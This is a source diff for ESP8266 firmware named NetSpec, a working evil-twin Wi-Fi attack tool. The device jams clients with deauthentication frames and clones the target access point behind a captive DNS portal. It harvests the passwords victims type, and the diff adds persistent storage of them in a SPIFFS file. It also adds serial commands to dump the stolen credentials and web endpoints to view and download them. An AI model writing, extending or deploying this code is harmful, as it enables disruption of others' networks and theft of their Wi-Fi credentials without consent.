@@ -3,7 +3,7 @@
 #include <DNSServer.h>
 #include <ESP8266WebServer.h>
 #include <ArduinoJson.h>
-#include <EEPROM.h>
+#include <FS.h>
 
 extern "C" {
 #include "user_interface.h"
@@ -16,11 +16,8 @@ extern "C" {
 #define ADMIN_PORT 8080
 #define MAX_NETWORKS 16
 #define MAX_CREDS 50
-#define EEPROM_SIZE 4096
 #define SCAN_INT 15000
 #define DEAUTH_INT 1000
-#define STATUS_INT 2000
-#define MAGIC_BYTE 0xAA
 
 struct Network {
   String ssid;
@@ -33,6 +30,8 @@ struct Network {
 struct Credential {
   String ssid, bssid, password;
   unsigned long timestamp;
+  Credential() : ssid(""), bssid(""), password(""), timestamp(0) {}
+  Credential(String s, String b, String p, unsigned long t) : ssid(s), bssid(b), password(p), timestamp(t) {}
 };
 
 DNSServer dnsServer;
@@ -46,7 +45,6 @@ String lastPassword = "";
 
 bool twinActive = false;
 bool deauthActive = false;
-String portalLang = "en";
 unsigned long lastScan = 0;
 unsigned long lastDeauth = 0;
 unsigned long startMillis = 0;
@@ -74,6 +72,47 @@ String formatTime(unsigned long ms) {
   return String(buf);
 }
 
+void logToSerial(String ssid, String bssid, String password) {
+  Serial.println("\n════════════════════════════════════════");
+  Serial.println("         REAL-TIME CAPTURE LOG");
+  Serial.println("════════════════════════════════════════");
+  Serial.printf("Timestamp: %lu\n", millis());
+  Serial.printf("SSID: %s\n", ssid.c_str());
+  Serial.printf("Password: %s\n", password.c_str());
+  Serial.printf("BSSID: %s\n", bssid.c_str());
+  Serial.printf("Total Stored: %d/%d\n", credentials.size(), MAX_CREDS);
+  Serial.println("════════════════════════════════════════\n");
+}
+
+void checkFileSystem() {
+  Serial.println("\n=== FILE SYSTEM STATUS ===");
+  
+  if (!SPIFFS.begin()) {
+    Serial.println("SPIFFS not mounted");
+    return;
+  }
+  
+  if (SPIFFS.exists("/credentials.json")) {
+    File file = SPIFFS.open("/credentials.json", "r");
+    if (file) {
+      size_t size = file.size();
+      Serial.printf("File: /credentials.json (%d bytes)\n", size);
+      file.close();
+    }
+  } else {
+    Serial.println("File not found: /credentials.json");
+  }
+  
+  Serial.println("Files in SPIFFS:");
+  Dir dir = SPIFFS.openDir("/");
+  int fileCount = 0;
+  while (dir.next()) {
+    Serial.printf("  %s (%d bytes)\n", dir.fileName().c_str(), dir.fileSize());
+    fileCount++;
+  }
+  if (fileCount == 0) Serial.println("  (empty)");
+}
+
 void scanWiFi() {
   int n = WiFi.scanNetworks();
   memset(networks, 0, sizeof(networks));
@@ -87,83 +126,197 @@ void scanWiFi() {
   Serial.printf("Scan: %d networks\n", n);
 }
 
+bool saveToFileSystem() {
+  Serial.println("\nSaving to SPIFFS...");
+  
+  if (credentials.empty()) {
+    File file = SPIFFS.open("/credentials.json", "w");
+    if (file) {
+      file.print("[]");
+      file.close();
+      return true;
+    }
+    return false;
+  }
+  
+  DynamicJsonDocument doc(4096);
+  JsonArray arr = doc.to<JsonArray>();
+  
+  for (size_t i = 0; i < credentials.size(); i++) {
+    JsonObject obj = arr.createNestedObject();
+    obj["ssid"] = credentials[i].ssid;
+    obj["bssid"] = credentials[i].bssid;
+    obj["password"] = credentials[i].password;
+    obj["timestamp"] = credentials[i].timestamp;
+  }
+  
+  File file = SPIFFS.open("/credentials.json", "w");
+  if (!file) {
+    return false;
+  }
+  
+  serializeJsonPretty(doc, file);
+  file.close();
+  
+  delay(50);
+  if (SPIFFS.exists("/credentials.json")) {
+    File verify = SPIFFS.open("/credentials.json", "r");
+    size_t size = verify.size();
+    verify.close();
+    return true;
+  } else {
+    return false;
+  }
+}
+
 void addCredential(String ssid, String bssid, String pass) {
-  for (const auto& c : credentials) {
-    if (c.ssid == ssid && c.bssid == bssid && c.password == pass) return;
+  Serial.println("\nAdding new credential...");
+  
+  for (size_t i = 0; i < credentials.size(); i++) {
+    if (credentials[i].ssid == ssid && 
+        credentials[i].bssid == bssid && 
+        credentials[i].password == pass) {
+      Serial.println("Duplicate credential, skipping");
+      return;
+    }
   }
   
   if (credentials.size() >= MAX_CREDS) {
+    Serial.println("Max credentials reached, removing oldest");
     credentials.erase(credentials.begin());
   }
   
-  Credential cred = {ssid, bssid, pass, millis()};
+  Credential cred(ssid, bssid, pass, millis());
   credentials.push_back(cred);
   
-  Serial.println("\n=== CREDENTIAL CAPTURED ===");
-  Serial.printf("SSID: %s\n", ssid.c_str());
-  Serial.printf("Pass: %s\n", pass.c_str());
-  Serial.printf("Total: %d/%d\n", credentials.size(), MAX_CREDS);
-  Serial.println("==========================\n");
+  logToSerial(ssid, bssid, pass);
+  
+  Serial.println("Auto-saving to file...");
+  if (saveToFileSystem()) {
+    Serial.println("Saved to SPIFFS");
+  } else {
+    Serial.println("Save to file failed");
+  }
 }
 
-bool saveToEEPROM() {
-  DynamicJsonDocument doc(3584);
-  JsonArray arr = doc.to<JsonArray>();
+void loadFromFileSystem() {
+  Serial.println("\nLoading credentials from SPIFFS...");
   
-  for (const auto& c : credentials) {
-    JsonObject obj = arr.createNestedObject();
-    obj["ssid"] = c.ssid;
-    obj["bssid"] = c.bssid;
-    obj["password"] = c.password;
-    obj["timestamp"] = c.timestamp;
+  if (!SPIFFS.begin()) {
+    Serial.println("SPIFFS mount failed");
+    return;
   }
   
-  String json;
-  serializeJson(doc, json);
-  int len = json.length();
-  
-  if (len > EEPROM_SIZE - 3) return false;
-  
-  EEPROM.write(0, MAGIC_BYTE);
-  EEPROM.write(1, len >> 8);
-  EEPROM.write(2, len & 0xFF);
-  
-  for (int i = 0; i < len; i++) {
-    EEPROM.write(i + 3, json[i]);
+  if (!SPIFFS.exists("/credentials.json")) {
+    File file = SPIFFS.open("/credentials.json", "w");
+    if (file) {
+      file.print("[]");
+      file.close();
+    }
+    credentials.clear();
+    return;
   }
   
-  return EEPROM.commit();
-}
-
-void loadFromEEPROM() {
-  if (EEPROM.read(0) != MAGIC_BYTE) return;
-  
-  int len = (EEPROM.read(1) << 8) | EEPROM.read(2);
-  if (len <= 0 || len > EEPROM_SIZE - 3) return;
-  
-  String json = "";
-  for (int i = 0; i < len; i++) {
-    json += (char)EEPROM.read(i + 3);
+  File file = SPIFFS.open("/credentials.json", "r");
+  if (!file) {
+    Serial.println("Cannot open file for reading");
+    credentials.clear();
+    return;
   }
   
-  DynamicJsonDocument doc(3584);
-  if (deserializeJson(doc, json)) return;
+  size_t size = file.size();
+  
+  if (size == 0) {
+    file.close();
+    credentials.clear();
+    return;
+  }
+  
+  String fileContent = file.readString();
+  file.close();
+  
+  DynamicJsonDocument doc(4096);
+  DeserializationError error = deserializeJson(doc, fileContent);
+  
+  if (error) {
+    File fix = SPIFFS.open("/credentials.json", "w");
+    if (fix) {
+      fix.print("[]");
+      fix.close();
+    }
+    credentials.clear();
+    return;
+  }
   
   credentials.clear();
-  for (JsonObject obj : doc.as<JsonArray>()) {
-    Credential c = {
-      obj["ssid"].as<String>(),
-      obj["bssid"].as<String>(),
-      obj["password"].as<String>(),
-      obj["timestamp"].as<unsigned long>()
-    };
-    credentials.push_back(c);
+  
+  if (!doc.is<JsonArray>()) {
+    credentials.clear();
+    return;
+  }
+  
+  JsonArray arr = doc.as<JsonArray>();
+  
+  for (JsonObject obj : arr) {
+    if (obj.containsKey("ssid") && obj.containsKey("password")) {
+      Credential cred;
+      cred.ssid = obj["ssid"].as<String>();
+      cred.bssid = obj["bssid"].as<String>();
+      cred.password = obj["password"].as<String>();
+      cred.timestamp = obj["timestamp"].as<unsigned long>();
+      
+      if (cred.ssid.length() > 0 && cred.password.length() > 0) {
+        credentials.push_back(cred);
+      }
+    }
+  }
+  
+  Serial.printf("Loaded %d credentials\n", credentials.size());
+}
+
+void clearFileSystem() {
+  Serial.println("\nClearing all credentials...");
+  
+  credentials.clear();
+  
+  if (!SPIFFS.begin()) {
+    Serial.println("SPIFFS not mounted");
+    return;
+  }
+  
+  if (SPIFFS.exists("/credentials.json")) {
+    SPIFFS.remove("/credentials.json");
+  }
+  
+  File file = SPIFFS.open("/credentials.json", "w");
+  if (file) {
+    file.print("[]");
+    file.close();
   }
 }
 
-void clearEEPROM() {
-  for (int i = 0; i < 256; i++) EEPROM.write(i, 0);
-  EEPROM.commit();
+void dumpFileContent() {
+  Serial.println("\n=== FILE CONTENT DUMP ===");
+  
+  if (!SPIFFS.begin()) {
+    Serial.println("SPIFFS not mounted");
+    return;
+  }
+  
+  if (SPIFFS.exists("/credentials.json")) {
+    File file = SPIFFS.open("/credentials.json", "r");
+    if (file) {
+      Serial.println("File content:");
+      Serial.println("----------------------------------------");
+      while (file.available()) {
+        Serial.write(file.read());
+      }
+      Serial.println("\n----------------------------------------");
+      file.close();
+    }
+  } else {
+    Serial.println("File not found");
+  }
 }
 
 void sendDeauth() {
@@ -196,7 +349,7 @@ void startTwin() {
   dnsServer.start(DNS_PORT, "*", IPAddress(192,168,4,1));
   
   twinActive = true;
-  Serial.printf("Twin: %s\n", targetNet.ssid.c_str());
+  Serial.printf("Twin AP: %s\n", targetNet.ssid.c_str());
 }
 
 void stopTwin() {
@@ -281,6 +434,8 @@ void handlePortalSubmit() {
 
 void handleResult() {
   if (WiFi.status() != WL_CONNECTED) {
+    addCredential(targetNet.ssid, macToStr(targetNet.bssid), lastPassword);
+    
     webServer.send(200, "text/html",
       "<!DOCTYPE html><html><head><meta name=viewport content='width=device-width,initial-scale=1'></head>"
       "<body style='background:#000;color:#f00;font-family:monospace;text-align:center;padding:50px'>"
@@ -292,6 +447,7 @@ void handleResult() {
     );
   } else {
     addCredential(targetNet.ssid, macToStr(targetNet.bssid), lastPassword);
+    
     webServer.send(200, "text/html",
       "<!DOCTYPE html><html><head><meta name=viewport content='width=device-width,initial-scale=1'></head>"
       "<body style='background:#000;color:#0f0;font-family:monospace;text-align:center;padding:50px'>"
@@ -340,27 +496,68 @@ void handleNetworksUpdate() {
   adminServer.send(200, "text/html", html);
 }
 
-void handleCredentialsUpdate() {
-  String html = "";
-  
-  if (credentials.empty()) {
-    html = "<div style=color:#666;text-align:center;padding:20px>NO CREDENTIALS</div>";
-  } else {
-    for (int i = credentials.size() - 1; i >= 0; i--) {
-      html += "<div class=cred>";
-      html += "<div style='color:#0f0;font-size:14px;margin-bottom:5px'>📶 " + credentials[i].ssid + "</div>";
-      html += "<div class=pass>" + credentials[i].password + "</div>";
-      html += "<div style='color:#666;font-size:11px'>" + credentials[i].bssid + " | " + formatTime(credentials[i].timestamp) + "</div>";
-      html += "</div>";
-    }
+void handleFileDownload() {
+  if (!SPIFFS.begin()) {
+    adminServer.send(500, "text/plain", "SPIFFS not mounted");
+    return;
   }
+  
+  if (!SPIFFS.exists("/credentials.json")) {
+    adminServer.send(404, "text/plain", "File not found");
+    return;
+  }
+  
+  File file = SPIFFS.open("/credentials.json", "r");
+  if (!file) {
+    adminServer.send(500, "text/plain", "Cannot open file");
+    return;
+  }
+  
+  adminServer.sendHeader("Content-Type", "application/json");
+  adminServer.sendHeader("Content-Disposition", "attachment; filename=credentials.json");
+  adminServer.streamFile(file, "application/json");
+  file.close();
+}
+
+void handleFileView() {
+  String html = "<!DOCTYPE html><html><head><meta charset=UTF-8>";
+  html += "<title>Credentials File</title><style>";
+  html += "body{font-family:'Courier New',monospace;background:#0a0a0a;color:#0f0;padding:20px}";
+  html += ".container{max-width:1000px;margin:auto}";
+  html += "pre{background:#111;padding:15px;border:1px solid #0f0;overflow:auto;max-height:500px}";
+  html += ".btn{display:inline-block;padding:8px 12px;margin:2px;background:#1a1a1a;border:1px solid #0f0;color:#0f0;text-decoration:none;font-size:12px}";
+  html += ".btn:hover{background:#0f0;color:#000}";
+  html += ".btn-small{padding:4px 8px;font-size:10px;margin:1px}";
+  html += "</style></head><body><div class=container>";
+  html += "<h2>credentials.json</h2>";
+  
+  if (SPIFFS.begin() && SPIFFS.exists("/credentials.json")) {
+    File file = SPIFFS.open("/credentials.json", "r");
+    if (file) {
+      html += "<pre>";
+      while (file.available()) {
+        html += (char)file.read();
+      }
+      html += "</pre>";
+      file.close();
+      html += "<p>File size: " + String(file.size()) + " bytes</p>";
+    }
+  } else {
+    html += "<p>File not found</p>";
+  }
+  
+  html += "<p>";
+  html += "<a class='btn btn-small' href='/download'>Download JSON</a> ";
+  html += "<a class='btn btn-small' href='/admin'>Back to Admin</a>";
+  html += "</p>";
+  html += "</div></body></html>";
   
   adminServer.send(200, "text/html", html);
 }
 
 void handleAdmin() {
   String html = "<!DOCTYPE html><html><head><meta charset=UTF-8><meta name=viewport content='width=device-width,initial-scale=1'>";
-  html += "<title>NetSpec Terminal</title><style>";
+  html += "<title>NetSpec</title><style>";
   html += "*{margin:0;padding:0;box-sizing:border-box}";
   html += "body{font-family:'Courier New',monospace;background:#0a0a0a;color:#0f0;padding:15px}";
   html += ".term{max-width:1200px;margin:auto}";
@@ -372,8 +569,9 @@ void handleAdmin() {
   html += ".badge.off{background:#333;color:#666;border-color:#444}";
   html += ".panel{background:#111;border:1px solid #333;padding:15px;margin-bottom:15px}";
   html += "h2{color:#0f0;margin-bottom:10px;font-size:16px}";
-  html += ".btn{display:inline-block;padding:10px 15px;margin:5px;background:#1a1a1a;border:1px solid #0f0;color:#0f0;cursor:pointer;text-decoration:none}";
+  html += ".btn{display:inline-block;padding:8px 12px;margin:2px;background:#1a1a1a;border:1px solid #0f0;color:#0f0;cursor:pointer;text-decoration:none;font-size:12px}";
   html += ".btn:hover{background:#0f0;color:#000}";
+  html += ".btn-small{padding:4px 8px;font-size:10px;margin:1px}";
   html += ".grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:10px;margin-bottom:15px}";
   html += ".net{background:#1a1a1a;border:1px solid #333;padding:10px;margin-bottom:8px;cursor:pointer}";
   html += ".net:hover{border-color:#0f0}";
@@ -386,20 +584,23 @@ void handleAdmin() {
   html += "input{width:100%;padding:10px;background:#1a1a1a;border:1px solid #333;color:#0f0;margin-bottom:10px}";
   html += "</style></head><body><div class=term>";
   
-  html += "<div class=header><div class=title>NETSPEC TERMINAL v1.0</div>";
+  html += "<div class=header><div class=title>NetSpec</div>";
   html += "<div class=sub>192.168.4.1:8080 | Uptime: " + formatTime(millis() - startMillis) + "</div>";
   html += "<span class='badge " + String(deauthActive?"on":"off") + "' id=deauthBadge>" + String(deauthActive?"DEAUTH ON":"DEAUTH OFF") + "</span>";
   html += "<span class='badge " + String(twinActive?"on":"off") + "' id=twinBadge>" + String(twinActive?"TWIN AP ON":"TWIN AP OFF") + "</span>";
-  html += "<span class='badge on' id=credBadge>CREDS: " + String(credentials.size()) + "</span></div>";
+  html += "<span class='badge on' id=credBadge>CREDS: " + String(credentials.size()) + "</span>";
+  html += "<a class='btn btn-small' href='/view' style='float:right'>View</a>";
+  html += "<a class='btn btn-small' href='/download' style='float:right;margin-right:5px'>Download</a>";
+  html += "</div>";
   
-  html += "<div class=panel><h2>⚡ CONTROLS</h2><div class=grid>";
+  html += "<div class=panel><h2>CONTROLS</h2><div class=grid>";
   html += "<a class=btn onclick='scan()'>SCAN</a>";
   html += "<a class=btn onclick='toggleDeauth()'>" + String(deauthActive?"STOP":"START") + " DEAUTH</a>";
   html += "<a class=btn onclick='toggleTwin()'>" + String(twinActive?"STOP":"START") + " TWIN</a>";
-  html += "<a class=btn onclick='clearCreds()'>CLEAR</a>";
+  html += "<a class=btn onclick='clearCreds()'>CLEAR ALL</a>";
   html += "</div></div>";
   
-  html += "<div class=panel><h2>📡 NETWORKS <span style='font-size:12px;color:#666'>(auto-updates)</span></h2>";
+  html += "<div class=panel><h2>NETWORKS</h2>";
   html += "<input type=text id=customSSID placeholder='Custom SSID' maxlength=32>";
   html += "<a class=btn onclick='useCustom()' style='display:block;text-align:center'>USE CUSTOM</a><br>";
   html += "<div id=networksContainer>";
@@ -423,9 +624,9 @@ void handleAdmin() {
   if (!hasNet) html += "<div style=color:#666;text-align:center;padding:20px>NO NETWORKS FOUND</div>";
   html += "</div></div>";
   
-  html += "<div class=panel><h2>🔐 CAPTURED";
+  html += "<div class=panel><h2>CAPTURED";
   if (credentials.size() > 0) html += " [" + String(credentials.size()) + "/" + String(MAX_CREDS) + "]";
-  html += " <span style='font-size:12px;color:#666'>(static)</span></h2>";
+  html += "</h2>";
   html += "<div id=credentialsContainer>";
   
   if (credentials.empty()) {
@@ -433,9 +634,9 @@ void handleAdmin() {
   } else {
     for (int i = credentials.size() - 1; i >= 0; i--) {
       html += "<div class=cred>";
-      html += "<div style='color:#0f0;font-size:14px;margin-bottom:5px'>📶 " + credentials[i].ssid + "</div>";
+      html += "<div style='color:#0f0;font-size:14px;margin-bottom:5px'>" + credentials[i].ssid + "</div>";
       html += "<div class=pass>" + credentials[i].password + "</div>";
-      html += "<div style='color:#666;font-size:11px'>" + credentials[i].bssid + " | " + formatTime(credentials[i].timestamp) + "</div>";
+      html += "<div style='color:#666;font-size:11px'>" + credentials[i].bssid + " | " + formatTime(millis() - credentials[i].timestamp) + " ago</div>";
       html += "</div>";
     }
   }
@@ -446,11 +647,10 @@ void handleAdmin() {
   html += "function scan(){if(!scanInProgress){scanInProgress=true;fetch('/api/scan',{method:'POST'}).then(()=>{setTimeout(()=>{updateNetworks();scanInProgress=false},2000)})}}";
   html += "function toggleDeauth(){fetch('/api/deauth/toggle',{method:'POST'}).then(r=>r.json()).then(data=>{document.getElementById('deauthBadge').className='badge '+(data.deauth?'on':'off');document.getElementById('deauthBadge').textContent=data.deauth?'DEAUTH ON':'DEAUTH OFF'})}";
   html += "function toggleTwin(){fetch('/api/twin/toggle',{method:'POST'}).then(r=>r.json()).then(data=>{document.getElementById('twinBadge').className='badge '+(data.twin?'on':'off');document.getElementById('twinBadge').textContent=data.twin?'TWIN AP ON':'TWIN AP OFF'})}";
-  html += "function clearCreds(){if(confirm('Clear all?'))fetch('/api/creds/clear',{method:'POST'}).then(()=>{document.getElementById('credBadge').textContent='CREDS: 0';document.getElementById('credentialsContainer').innerHTML='<div style=color:#666;text-align:center;padding:20px>NO CREDENTIALS</div>'})}";
+  html += "function clearCreds(){if(confirm('Clear all credentials?'))fetch('/api/creds/clear',{method:'POST'}).then(()=>{document.getElementById('credBadge').textContent='CREDS: 0';document.getElementById('credentialsContainer').innerHTML='<div style=color:#666;text-align:center;padding:20px>NO CREDENTIALS</div>'})}";
   html += "function select(bssid){fetch('/api/select',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({bssid:bssid})}).then(()=>updateNetworks())}";
   html += "function useCustom(){let s=document.getElementById('customSSID').value.trim();if(s.length>0&&s.length<=32)fetch('/api/select',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({bssid:'custom',ssid:s})}).then(()=>updateNetworks())}";
   html += "function updateNetworks(){fetch('/update/networks').then(r=>r.text()).then(html=>{document.getElementById('networksContainer').innerHTML=html})}";
-  html += "function updateCredentials(){fetch('/update/credentials').then(r=>r.text()).then(html=>{document.getElementById('credentialsContainer').innerHTML=html;document.getElementById('credBadge').textContent='CREDS: '+document.querySelectorAll('.cred').length})}";
   html += "setInterval(updateNetworks,3000);";
   html += "</script></div></body></html>";
   
@@ -459,11 +659,38 @@ void handleAdmin() {
 
 void setup() {
   Serial.begin(115200);
-  Serial.println("\n\nNETSPEC v1.0\n");
+  
+  unsigned long startWait = millis();
+  while (!Serial && (millis() - startWait < 5000)) {
+    delay(10);
+  }
+  
+  while (Serial.available()) {
+    Serial.read();
+  }
+  
+  delay(1000);
+  
+  Serial.println("\n\n\n\n");
+  Serial.println("════════════════════════════════════════");
+  Serial.println("                NetSpec");
+  Serial.println("════════════════════════════════════════\n");
   
   startMillis = millis();
-  EEPROM.begin(EEPROM_SIZE);
-  loadFromEEPROM();
+  
+  Serial.println("Initializing SPIFFS...");
+  delay(500);
+  
+  bool fsOk = false;
+  for (int i = 0; i < 3; i++) {
+    if (SPIFFS.begin()) {
+      fsOk = true;
+      break;
+    }
+    delay(1000);
+  }
+  
+  loadFromFileSystem();
   
   WiFi.mode(WIFI_AP_STA);
   wifi_promiscuous_enable(1);
@@ -523,13 +750,13 @@ void setup() {
   });
   
   adminServer.on("/api/creds/clear", HTTP_POST, []() { 
-    credentials.clear(); 
-    clearEEPROM();
+    clearFileSystem(); 
     adminServer.send(200, "application/json", "{\"ok\":true}"); 
   });
   
+  adminServer.on("/download", handleFileDownload);
+  adminServer.on("/view", handleFileView);
   adminServer.on("/update/networks", handleNetworksUpdate);
-  adminServer.on("/update/credentials", handleCredentialsUpdate);
   adminServer.on("/admin", handleAdmin);
   adminServer.on("/", handleAdmin);
   
@@ -542,8 +769,18 @@ void setup() {
   Serial.println("AP: " + String(ADMIN_SSID));
   Serial.println("Pass: " + String(ADMIN_PASS));
   Serial.println("Admin: http://192.168.4.1:8080");
-  Serial.println("Portal: Port 80");
-  Serial.println();
+  Serial.println("File View: http://192.168.4.1:8080/view");
+  Serial.println("Download: http://192.168.4.1:8080/download");
+  Serial.println("Storage: SPIFFS");
+  Serial.println("\nSerial Commands:");
+  Serial.println("  d - Dump all credentials");
+  Serial.println("  f - Check filesystem");
+  Serial.println("  s - Manual save to file");
+  Serial.println("  l - Show file content");
+  Serial.println("  c - Clear all data");
+  Serial.println("  t - Test SPIFFS");
+  Serial.println("\nSet Serial Monitor to 115200 baud");
+  Serial.println("════════════════════════════════════════\n");
   
   scanWiFi();
 }
@@ -561,5 +798,78 @@ void loop() {
   if (millis() - lastScan >= SCAN_INT && !twinActive) {
     scanWiFi();
     lastScan = millis();
+  }
+  
+  if (Serial.available()) {
+    char cmd = Serial.read();
+    
+    if (cmd == 'd' || cmd == 'D') {
+      Serial.println("\n=== DUMP ALL CREDENTIALS ===");
+      if (credentials.size() > 0) {
+        for (size_t i = 0; i < credentials.size(); i++) {
+          Serial.printf("\n[%d] SSID: %s\n", i+1, credentials[i].ssid.c_str());
+          Serial.printf("    Pass: %s\n", credentials[i].password.c_str());
+          Serial.printf("    BSSID: %s\n", credentials[i].bssid.c_str());
+          Serial.printf("    Time: %s ago\n", formatTime(millis() - credentials[i].timestamp).c_str());
+        }
+        Serial.printf("\nTotal: %d credentials\n", credentials.size());
+      } else {
+        Serial.println("No credentials stored");
+      }
+    }
+    
+    else if (cmd == 'f' || cmd == 'F') {
+      checkFileSystem();
+    }
+    
+    else if (cmd == 's' || cmd == 'S') {
+      Serial.println("Manual save...");
+      if (saveToFileSystem()) {
+        Serial.println("Saved to SPIFFS");
+      } else {
+        Serial.println("Save failed");
+      }
+    }
+    
+    else if (cmd == 'l' || cmd == 'L') {
+      dumpFileContent();
+    }
+    
+    else if (cmd == 'c' || cmd == 'C') {
+      Serial.println("Clearing all data...");
+      clearFileSystem();
+      Serial.println("All data cleared");
+    }
+    
+    else if (cmd == 't' || cmd == 'T') {
+      Serial.println("\n=== TEST SPIFFS ===");
+      if (SPIFFS.begin()) {
+        Serial.println("SPIFFS mounted");
+        
+        File test = SPIFFS.open("/test.txt", "w");
+        if (test) {
+          test.print("SPIFFS Test at " + String(millis()));
+          test.close();
+          Serial.println("Test file written");
+        }
+        
+        if (SPIFFS.exists("/test.txt")) {
+          File read = SPIFFS.open("/test.txt", "r");
+          Serial.println("Test content: " + read.readString());
+          read.close();
+        }
+        
+        if (SPIFFS.exists("/credentials.json")) {
+          File creds = SPIFFS.open("/credentials.json", "r");
+          size_t size = creds.size();
+          creds.close();
+          Serial.printf("credentials.json exists (%d bytes)\n", size);
+        } else {
+          Serial.println("credentials.json does NOT exist");
+        }
+      } else {
+        Serial.println("SPIFFS not mounted");
+      }
+    }
   }
 }
